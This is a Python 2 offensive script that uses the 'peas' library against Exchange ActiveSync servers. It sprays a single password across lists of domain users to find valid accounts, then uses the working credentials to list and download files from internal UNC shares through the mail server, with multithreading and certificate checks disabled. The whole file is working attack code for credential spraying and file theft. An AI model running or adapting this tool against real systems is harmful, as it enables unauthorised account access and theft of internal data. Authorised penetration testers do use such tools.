import peas
import argparse
from Queue import Queue
from threading import Thread,Lock,current_thread
import string
from termcolor import colored
import logging
import os
import binascii
import time
import chardet

def check_credentials():
    client = peas.Peas()
    client.disable_certificate_verification()
    while True:
        user = q.get()
        client.set_creds({
            'server': host,
            'user': domain + "\\" + user,
            'password': password,
        })
        try:
            auth_true = client.check_auth()
            if auth_true:
                with global_lock:
                    print domain + "\\" + user + ":" + password
        except Exception as e:
            with global_lock:
                logging.debug(colored(str(type(e)) + " " + str(e), 'red'))
        q.task_done()

def list_files():
    client = peas.Peas()
    client.disable_certificate_verification()
    while True:
        if q is not None:
            path = q.get()
            for creds in creds_list:
                client.set_creds({
                    'server': host,
                    'user': domain+"\\"+creds['user'],
                    'password': creds['password'],
                })
                with global_lock:
                    logging.info("Trying: " + creds['user'] + ":" + creds['password'] + ": " + path + "\\")
                try:
                    listing = client.get_unc_listing(r'%s' % path)
                    for row in listing[1:]:
                        if row.get('IsFolder', None) != '1':
                            with global_lock:
                                print row['LinkId']
                        if row.get('IsFolder', None) == '1':
                            if not flag_norecurse:
                                q.put(row['LinkId'])
                            with global_lock:
                                print row['LinkId'] + "\\"
                    if len(listing) > 1:
                        break
                except (IndexError,KeyError,IOError):
                    with global_lock:
                        logging.debug("Sync error, retrying: " + path)
                        time.sleep(1)
                    q.put(path)
                    break
                except Exception as e:
                    with global_lock:
                        logging.debug(colored(str(type(e)) + " " + str(e), 'red'))
            q.task_done()
        else:
            break


def get_files():
    client = peas.Peas()
    client.disable_certificate_verification()
    while True:
        if q is not None:
            path = q.get(True)
            cannot_access = True
            for creds in creds_list:
                client.set_creds({
                    'server': host,
                    'user': domain+"\\"+creds['user'],
                    'password': creds['password'],
                })
                try:
                    downloaded = client.get_unc_file(path)
                    with global_lock:
                        print "Downloaded with " + domain + "\\" + creds['user'] + ":" + creds['password'] + ": " + path
                    filename = path.replace("\\", "_")[2:]
                    fullname = os.path.join(os.getcwd(), out_dir, filename)
                    with open(fullname, 'wb') as f:
                        f.write(downloaded)
                    cannot_access = False
                    break
                except (IndexError,KeyError,binascii.Error,AttributeError,EOFError):
                    with global_lock:
                        logging.debug("Download error, retrying: " + path)
                    q.put(path)
                    cannot_access = False
                    break
                except TypeError:
                    logging.debug("Failed with " + domain + "\\" + creds['user'] + ":" + creds['password'] + ": " + path)
                    continue
                except Exception as e:
                    with global_lock:
                        logging.debug(colored(str(type(e)) + " " + str(e), 'red'))
                        raise
                    cannot_access = False
                    break
            if cannot_access:   
                with global_lock:
                    print colored("Cannot access: " + path, 'yellow')
            q.task_done()
        else:
        	break


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--list", help="list files",action="store_true")
parser.add_argument("-c", "--check", help="checks the user credentials",action="store_true")
parser.add_argument("-g", "--get", help="get file by unc path",action="store_true")
parser.add_argument("-d", "--domain", help="user domain")
parser.add_argument("-u", "--user", help="username")
parser.add_argument("--user-list", help="file with list of users")
parser.add_argument("--creds-list", help="list of creds user password separated by space, to get files with different access rights")
parser.add_argument("-p", "--password", help="password")
parser.add_argument("--path", help="the unc path to share")
parser.add_argument("--path-list", help="file containing the unc paths to list")
parser.add_argument("-o", "--out-dir", help="folder to save downloaded files, default current dir",default='./')
parser.add_argument("-t", "--threads", help="the unc path to share", type=int, default=1)
parser.add_argument("host", help="ip address of activesync host")
parser.add_argument("-v", "--verbose", help="show errors", action="store_true")
parser.add_argument("--no-recurse", help="disable recursive scan", action="store_true")
args = parser.parse_args()


#parse arguments
flag_check = args.check
flag_list = args.list
flag_get = args.get
flag_norecurse = args.no_recurse
domain = args.domain
user = args.user
user_list = args.user_list
if user_list is not None:
    with open(user_list) as f:
        users = f.read().splitlines()
elif user is not None:
    users = [user]
password = args.password
path = args.path
path_list = args.path_list

if path_list is not None:
    with open(path_list) as f:
        paths = f.read().splitlines()
elif path is not None:
    paths = [path]
out_dir = args.out_dir
threads = args.threads
host = args.host
verbose = args.verbose
creds_list_file = args.creds_list
if (user is not None) and (password is not None): creds_list = [({'user':user,'password':password})]
else: creds_list = []
if creds_list_file is not None:
    with open(creds_list_file) as f:
        fullcred = f.read().splitlines()
        for item in fullcred:
            user = item.split()[0]
            password = item.split()[1]
            creds_list.append({'user':user,'password':password})


#main
if verbose:
    logging.basicConfig(level=logging.DEBUG)
else:
    logging.basicConfig(level=logging.WARNING)
q = Queue()
global_lock = Lock()

if flag_check:
    for i in range(threads):
        t = Thread(target=check_credentials)
        t.daemon = True
        t.start()
    for user in users:
        q.put(user)
elif flag_list:
    for i in range(threads):
        t = Thread(target=list_files)
        t.daemon = True
        t.start()
    for path in paths:
        q.put(path)
        #time.sleep(2)
elif flag_get:
    for i in range(threads):
        t = Thread(target=get_files)
        t.daemon = True
        t.start()
    for path in paths:
        q.put(path)

q.join()
